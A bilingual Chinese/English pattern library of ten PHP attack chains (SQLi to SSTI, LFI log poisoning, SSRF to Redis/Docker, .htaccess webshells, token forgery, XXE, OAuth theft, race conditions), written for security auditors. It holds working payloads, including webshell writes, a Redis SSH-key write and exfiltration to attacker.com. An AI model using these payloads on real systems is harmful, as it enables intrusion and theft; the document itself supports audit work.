# Attack Chain Pattern Library / 攻击链模式库

> 已知的多步攻击链模式，用于 PHP 项目安全审计时识别跨漏洞组合利用路径。
> Each chain includes a diagram, prerequisites, and per-step sink type mapping.

---

## 1. SQLi -> SSTI 链 (SQL Injection to Server-Side Template Injection)

**Chain Diagram / 链路图:**

```
A (User Input) → B (SQL Injection) → C (Query Result Rendered in Template) → D (SSTI / RCE)
```

**Prerequisites / 前提条件:**
- 应用存在 SQL 注入点（通常为 SELECT 查询，结果会回显）
- SQL 查询结果未经转义直接拼入模板引擎（Twig, Blade, Smarty 等）
- 模板引擎未启用沙箱模式或沙箱配置不当

**Step-by-Step Sink Mapping / 各步骤 Sink 类型:**

| Step | Action | Sink Type |
|------|--------|-----------|
| A | 用户输入进入 SQL 查询 | `SQL_INJECTION` |
| B | SQL 查询返回恶意模板语法 | `DATA_FLOW` (中间传递) |
| C | 结果拼入模板字符串并渲染 | `SSTI` |
| D | 模板引擎执行任意代码 | `CODE_EXECUTION` |

**Hex Encoding Bypass / 十六进制编码绕过:**

当 WAF 或输入过滤拦截 `{{` `}}` 时，可在 SQL 层使用 hex 编码绕过：

```sql
-- 原始 payload: {{7*7}} 或 {{_self.env.registerUndefinedFilterCallback("exec")}}
-- Hex 编码后存入数据库:
SELECT 0x7b7b372a377d7d;          -- 返回 {{7*7}}
SELECT 0x7b7b5f73656c662e656e762e7265676973746572556e646566696e656446696c74657243616c6c6261636b28226578656322297d7d;
-- 数据库存储的是原始字节, 取出后模板引擎直接解析 {{...}}
```

**Detection Pattern / 检测要点:**
- 审计所有 SQL 查询结果进入 `render()`, `display()`, `Blade::compileString()` 的路径
- 关注 `CONCAT()`, `CHAR()`, `0x` 等编码函数在 SELECT 中的使用

---

## 2. LFI -> Log Poisoning -> RCE 链 (Local File Inclusion to Remote Code Execution)

**Chain Diagram / 链路图:**

```
A (Path Traversal / LFI) → B (Read Log File) → C (User-Agent Inject PHP Code into Log) → D (Include Log File) → E (RCE)
```

**Prerequisites / 前提条件:**
- 存在本地文件包含漏洞（`include`, `require`, `include_once` 等接受用户输入）
- Web 服务器日志路径可预测（如 `/var/log/apache2/access.log`, `/var/log/nginx/access.log`）
- 日志文件对 PHP 进程可读
- `allow_url_include` 不需要开启（本地文件即可）

**Step-by-Step Sink Mapping / 各步骤 Sink 类型:**

| Step | Action | Sink Type |
|------|--------|-----------|
| A | 路径穿越读取任意文件 | `PATH_TRAVERSAL` |
| B | 确认可读取日志文件 | `FILE_READ` |
| C | 发送含 PHP 代码的 User-Agent 请求 | `LOG_INJECTION` |
| D | 通过 LFI include 日志文件 | `FILE_INCLUSION` |
| E | PHP 引擎解析日志中的 `<?php ?>` 标签 | `CODE_EXECUTION` |

**Exploit Flow / 利用流程:**

```
# Step 1: 注入恶意 User-Agent 到日志
curl -A '<?php system($_GET["cmd"]); ?>' http://target.com/

# Step 2: 通过 LFI 包含日志文件
http://target.com/index.php?page=../../../var/log/apache2/access.log&cmd=id
```

**Common Log Paths / 常见日志路径:**
- Apache: `/var/log/apache2/access.log`, `/var/log/httpd/access_log`
- Nginx: `/var/log/nginx/access.log`
- PHP-FPM: `/var/log/php-fpm.log`
- 自定义 Laravel: `storage/logs/laravel.log`

---

## 3. SSRF -> 内部服务 -> RCE 链 (Server-Side Request Forgery to Internal Service Exploitation)

**Chain Diagram / 链路图:**

```
A (SSRF Entry Point) → B (Access Internal Service) → C (Exploit Internal API) → D (RCE / Data Exfil)
```

**Prerequisites / 前提条件:**
- 应用存在 SSRF 漏洞（`file_get_contents`, `curl_exec`, `fsockopen` 等接受用户控制的 URL）
- 内部网络存在未认证的敏感服务
- 无有效的 SSRF 防护（IP 黑名单不完善，可通过 DNS rebinding 等绕过）

**Step-by-Step Sink Mapping / 各步骤 Sink 类型:**

| Step | Action | Sink Type |
|------|--------|-----------|
| A | 用户控制请求目标 URL | `SSRF` |
| B | 请求到达内部服务 | `NETWORK_ACCESS` |
| C | 利用内部服务 API 执行操作 | `API_ABUSE` |
| D | 获得代码执行或数据 | `CODE_EXECUTION` / `DATA_LEAK` |

**Target: Docker API (localhost:2375):**

```
# 通过 SSRF 创建恶意容器
POST http://127.0.0.1:2375/containers/create
{"Image":"alpine","Cmd":["/bin/sh","-c","cat /etc/shadow"],"Binds":["/:/host"]}

# PHP SSRF payload
$url = "http://127.0.0.1:2375/containers/create";
```

**Target: Redis (localhost:6379) - Write Webshell:**

```
# 利用 gopher 协议通过 SSRF 操作 Redis 写 webshell
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a<?php eval($_POST[1]);?>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

**Target: Redis - Write SSH Key:**

```
# 写入 SSH 公钥到 /root/.ssh/authorized_keys
redis-cli -h 127.0.0.1 CONFIG SET dir /root/.ssh
redis-cli -h 127.0.0.1 CONFIG SET dbfilename authorized_keys
redis-cli -h 127.0.0.1 SET x "\n\nssh-rsa AAAA...your_key...\n\n"
redis-cli -h 127.0.0.1 SAVE
```

**Target: Internal Admin Panels:**
- `http://127.0.0.1:8080/admin` - 内部管理面板无认证
- `http://192.168.1.0/24` - 内网扫描发现其他服务

---

## 4. 文件上传 -> .htaccess -> Webshell 链 (File Upload to Apache Config Override to Webshell)

**Chain Diagram / 链路图:**

```
A (Upload .htaccess) → B (Override Apache Parse Rules) → C (Upload Webshell with Allowed Extension) → D (RCE)
```

**Prerequisites / 前提条件:**
- 上传功能未限制 `.htaccess` 文件上传（或可绕过文件名检测）
- Apache 配置启用了 `AllowOverride All` 或 `AllowOverride FileInfo`
- 上传目录可通过 Web 直接访问
- 知道上传目录的 Web 路径

**Step-by-Step Sink Mapping / 各步骤 Sink 类型:**

| Step | Action | Sink Type |
|------|--------|-----------|
| A | 上传 .htaccess 文件 | `FILE_UPLOAD` |
| B | Apache 加载新的解析规则 | `CONFIG_OVERRIDE` |
| C | 上传伪装扩展名的 webshell | `FILE_UPLOAD` |
| D | 访问 webshell 获得代码执行 | `CODE_EXECUTION` |

**Malicious .htaccess Content / 恶意 .htaccess 内容:**

```apache
# 方法 1: 将 .jpg 文件作为 PHP 解析
AddType application/x-httpd-php .jpg

# 方法 2: 将自定义扩展名作为 PHP 解析
AddType application/x-httpd-php .abc

# 方法 3: 使用 SetHandler
<FilesMatch "\.png$">
    SetHandler application/x-httpd-php
</FilesMatch>

# 方法 4: 配合 php_value 修改配置
php_value auto_prepend_file /tmp/evil.php
```

---

## 5. 信息泄露 -> Token 伪造 -> 权限提升链 (Information Disclosure to Token Forgery to Privilege Escalation)

**Chain Diagram / 链路图:**

```
A (Info Leak: .env / phpinfo / debug page) → B (Extract Secret Key / Token) → C (Forge Auth Token) → D (Privilege Escalation)
```

**Prerequisites / 前提条件:**
- 应用存在信息泄露点（`.env` 文件可访问, `phpinfo()` 暴露, debug 模式开启）
- 泄露的信息包含加密密钥、JWT secret 等敏感凭据
- 应用依赖这些密钥进行身份验证或授权

**Step-by-Step Sink Mapping / 各步骤 Sink 类型:**

| Step | Action | Sink Type |
|------|--------|-----------|
| A | 访问泄露的敏感配置 | `INFORMATION_DISCLOSURE` |
| B | 提取密钥/secret | `SECRET_EXTRACTION` |
| C | 使用密钥伪造令牌 | `TOKEN_FORGERY` |
| D | 以高权限身份操作 | `PRIVILEGE_ESCALATION` |

**Scenario A: Laravel .env Leak -> APP_KEY -> Encryption Forgery:**

```
# .env 泄露 APP_KEY
APP_KEY=base64:wLp2IS3xkVBaGOby9EfPJr/T5IfjRAaXjRD3WNMljJQ=

# 利用 APP_KEY 伪造 Laravel encrypted cookie / session
# 可直接反序列化攻击或伪造管理员 session
php artisan tinker
>>> encrypt(['user_id' => 1, 'role' => 'admin']);
```

**Scenario B: JWT Secret Leak -> Token Forgery:**

```php
// 泄露的 JWT secret
$secret = "leaked_jwt_secret_from_env";

// 伪造 admin token
$header = base64url_encode('{"alg":"HS256","typ":"JWT"}');
$payload = base64url_encode('{"sub":"1","role":"admin","exp":9999999999}');
$signature = hash_hmac('sha256', "$header.$payload", $secret, true);
$token = "$header.$payload." . base64url_encode($signature);
```

**Scenario C: phpinfo() -> Session Path -> Session Hijack:**

```
# phpinfo() 泄露 session.save_path = /var/lib/php/sessions
# 结合 LFI 读取其他用户的 session 文件
# /var/lib/php/sessions/sess_<SESSION_ID>
```

---

## 6. 反序列化 -> POP 链 -> RCE (Deserialization to POP Chain to Remote Code Execution)

**Chain Diagram / 链路图:**

```
A (User-Controlled Serialized Data) → B (unserialize() Trigger) → C (POP Chain Gadgets) → D (Arbitrary Code Execution)
```

**Prerequisites / 前提条件:**
- 应用使用 `unserialize()` 处理用户可控数据（Cookie, Session, 缓存, API 参数）
- 项目依赖中存在可利用的 POP gadget 类（Laravel, Symfony, Yii, Guzzle 等）
- PHP 版本和框架版本匹配已知 gadget chain

**Step-by-Step Sink Mapping / 各步骤 Sink 类型:**

| Step | Action | Sink Type |
|------|--------|-----------|
| A | 恶意序列化数据进入应用 | `DESERIALIZATION` |
| B | `unserialize()` 触发魔术方法 | `UNSAFE_DESERIALIZATION` |
| C | 魔术方法链式调用到危险函数 | `POP_CHAIN` |
| D | 最终 gadget 执行系统命令 | `CODE_EXECUTION` |

**Common PHP Framework Gadget Chains / 常见框架 Gadget 链:**

```
Laravel:  PendingBroadcast -> Dispatcher -> call_user_func()
Symfony:  FnStream -> __destruct() -> call_user_func()
Yii:      BatchQueryResult -> __destruct() -> close() -> call_user_func()
Guzzle:   FnStream -> __destruct() -> call_user_func_array()
Monolog:  BufferHandler -> __destruct() -> close() -> flush() -> write() -> system()
```

**Detection Pattern / 检测要点:**
- 搜索所有 `unserialize()` 调用，追踪参数来源
- 关注 `__destruct`, `__wakeup`, `__toString`, `__call` 魔术方法
- 使用 PHPGGC 工具验证可用 gadget chain

---

## 7. 二阶 SQLi -> 密码重置 -> 账户接管链 (Second-Order SQLi to Password Reset to Account Takeover)

**Chain Diagram / 链路图:**

```
A (Register with Malicious Username) → B (Malicious Data Stored in DB) → C (Password Change Triggers SQLi) → D (Admin Password Overwritten) → E (Account Takeover)
```

**Prerequisites / 前提条件:**
- 注册或资料修改功能对输入做了转义/参数化（写入安全）
- 密码修改/重置功能从数据库取出用户名后直接拼入 SQL（读取后使用不安全）
- 存在"信任已存储数据"的错误假设

**Step-by-Step Sink Mapping / 各步骤 Sink 类型:**

| Step | Action | Sink Type |
|------|--------|-----------|
| A | 注册用户名含 SQL payload | `DATA_INPUT` (安全写入) |
| B | 恶意数据存入数据库 | `DATA_STORE` |
| C | 密码修改取出用户名拼入 SQL | `SQL_INJECTION` (二阶触发) |
| D | UPDATE 语句修改 admin 密码 | `DATA_MANIPULATION` |
| E | 使用新密码登录管理员账户 | `ACCOUNT_TAKEOVER` |

**Exploit Example / 利用示例:**

```php
// Step A: 注册恶意用户名
$username = "admin'-- ";  // 或 "admin' OR '1'='1"

// Step C: 密码修改逻辑（存在二阶 SQLi）
$user = get_current_user();  // 从 DB 取出 "admin'-- "
$query = "UPDATE users SET password='$new_pass' WHERE username='$user'";
// 实际执行: UPDATE users SET password='hacked' WHERE username='admin'-- '
// 结果: admin 的密码被修改
```

---

## 8. XXE -> SSRF -> 内网探测链 (XML External Entity to SSRF to Internal Network Reconnaissance)

**Chain Diagram / 链路图:**

```
A (XML Input Point) → B (XXE Entity Declaration) → C (External Entity Fetches Internal URL) → D (Internal Service Response Leaked) → E (Further Exploitation)
```

**Prerequisites / 前提条件:**
- 应用解析用户提交的 XML 数据（API, 文件上传如 XLSX/DOCX/SVG, SOAP 端点）
- XML 解析器未禁用外部实体（`libxml_disable_entity_loader` 未设置，PHP < 8.0 默认危险）
- 内部网络存在可探测的服务

**Step-by-Step Sink Mapping / 各步骤 Sink 类型:**

| Step | Action | Sink Type |
|------|--------|-----------|
| A | 提交包含 DTD 的 XML | `XML_INJECTION` |
| B | 解析器处理外部实体声明 | `XXE` |
| C | 实体引用触发内部 HTTP/file 请求 | `SSRF` |
| D | 响应数据回显或通过 OOB 外带 | `INFORMATION_DISCLOSURE` |
| E | 利用获取的信息进一步攻击 | `LATERAL_MOVEMENT` |

**Payload Examples / Payload 示例:**

```xml
<!-- 基本 XXE -> 内网探测 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:8080/admin">
]>
<root>&xxe;</root>

<!-- OOB XXE (Blind) -> 外带数据 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>
```

---

## 9. Open Redirect -> OAuth Token Theft 链 (Open Redirect to OAuth Authorization Code/Token Theft)

**Chain Diagram / 链路图:**

```
A (Find Open Redirect on Target) → B (Craft OAuth URL with redirect_uri=open_redirect) → C (User Authorizes App) → D (Auth Code/Token Sent to Attacker via Redirect) → E (Account Takeover)
```

**Prerequisites / 前提条件:**
- 目标站点存在开放重定向漏洞（`header("Location: $user_input")`）
- OAuth 配置对 `redirect_uri` 校验不严（仅校验域名前缀，允许子路径）
- 攻击者可诱导用户点击构造好的 OAuth 授权链接

**Step-by-Step Sink Mapping / 各步骤 Sink 类型:**

| Step | Action | Sink Type |
|------|--------|-----------|
| A | 发现开放重定向端点 | `OPEN_REDIRECT` |
| B | 将重定向嵌入 OAuth redirect_uri | `OAUTH_MISCONFIGURATION` |
| C | 用户完成授权流程 | `SOCIAL_ENGINEERING` |
| D | Authorization code 经重定向发往攻击者 | `TOKEN_THEFT` |
| E | 攻击者用 code 换取 access_token | `ACCOUNT_TAKEOVER` |

**Exploit Example / 利用示例:**

```
# Step A: Open redirect on target
https://target.com/redirect?url=https://attacker.com

# Step B: Craft OAuth authorization URL
https://oauth.provider.com/authorize?
  client_id=TARGET_APP_ID&
  redirect_uri=https://target.com/redirect?url=https://attacker.com/steal&
  response_type=code&
  scope=openid+profile+email

# Step D: 用户授权后, code 被重定向到攻击者
https://attacker.com/steal?code=AUTHORIZATION_CODE
```

**PHP Detection Pattern / PHP 检测要点:**
- 审计所有 `header("Location: ...")` 中包含用户输入的位置
- 检查 OAuth redirect_uri 验证逻辑是否为严格的全匹配
- 注意 `parse_url()` 的解析歧义问题

---

## 10. 竞态条件 -> 双重支付 / 权限提升链 (Race Condition to Double Spend / Privilege Escalation)

**Chain Diagram / 链路图:**

```
A (Identify TOCTOU Vulnerable Endpoint) → B (Send Concurrent Requests) → C (Check Passes for All Requests Before State Update) → D (Multiple Operations Execute on Same Resource) → E (Balance Manipulation / Privilege Escalation)
```

**Prerequisites / 前提条件:**
- 应用存在 TOCTOU (Time of Check to Time of Use) 缺陷
- 关键业务逻辑未使用数据库事务或锁机制（`SELECT ... FOR UPDATE`, `LOCK IN SHARE MODE`）
- 并发请求能在检查与更新之间的时间窗口内到达

**Step-by-Step Sink Mapping / 各步骤 Sink 类型:**

| Step | Action | Sink Type |
|------|--------|-----------|
| A | 识别"先检查再操作"的逻辑 | `RACE_CONDITION` |
| B | 并发发送多个相同请求 | `CONCURRENT_REQUEST` |
| C | 所有请求通过余额/权限检查 | `TOCTOU_BYPASS` |
| D | 每个请求各执行一次扣款/操作 | `STATE_MANIPULATION` |
| E | 余额异常或权限被重复赋予 | `BUSINESS_LOGIC_BYPASS` |

**Vulnerable PHP Pattern / 易受攻击的 PHP 模式:**

```php
// 双重支付漏洞示例 - 无锁的余额检查
function transfer($from, $to, $amount) {
    $balance = DB::select("SELECT balance FROM accounts WHERE id = ?", [$from]);
    // TOCTOU 窗口: 在 check 和 update 之间，并发请求也能通过检查
    if ($balance >= $amount) {
        DB::update("UPDATE accounts SET balance = balance - ? WHERE id = ?", [$amount, $from]);
        DB::update("UPDATE accounts SET balance = balance + ? WHERE id = ?", [$amount, $to]);
    }
}

// 修复方案: 使用数据库事务 + 行级锁
function transfer_safe($from, $to, $amount) {
    DB::transaction(function () use ($from, $to, $amount) {
        $balance = DB::selectOne(
            "SELECT balance FROM accounts WHERE id = ? FOR UPDATE", [$from]
        )->balance;
        if ($balance >= $amount) {
            DB::update("UPDATE accounts SET balance = balance - ? WHERE id = ?", [$amount, $from]);
            DB::update("UPDATE accounts SET balance = balance + ? WHERE id = ?", [$amount, $to]);
        }
    });
}
```

**Exploitation Tool / 利用工具:**

```bash
# 使用 curl 并发发送请求触发竞态条件
for i in $(seq 1 20); do
  curl -s -X POST http://target.com/api/transfer \
    -d "to=attacker&amount=1000" \
    -H "Cookie: session=valid_session" &
done
wait
```

---

## Cross-Reference / 交叉参考

链之间存在组合可能，审计时应关注以下跨链路径:

| 起始漏洞 | 可衔接链 | 最终影响 |
|----------|---------|---------|
| SQLi (Chain 1) | -> 信息泄露 (Chain 5) -> Token 伪造 | 账户接管 |
| LFI (Chain 2) | -> 读取 .env (Chain 5) -> 反序列化 (Chain 6) | RCE |
| SSRF (Chain 3) | -> 内网 Redis -> 写 webshell | RCE |
| 文件上传 (Chain 4) | -> 上传恶意序列化数据 (Chain 6) | RCE |
| XXE (Chain 8) | -> SSRF (Chain 3) -> Docker API | RCE |
| Open Redirect (Chain 9) | -> OAuth Token -> 管理面板 -> 更多漏洞 | 完全控制 |

> **审计原则**: 单个低危漏洞组合后可能达到 Critical 级别。永远评估链式利用的可能性。
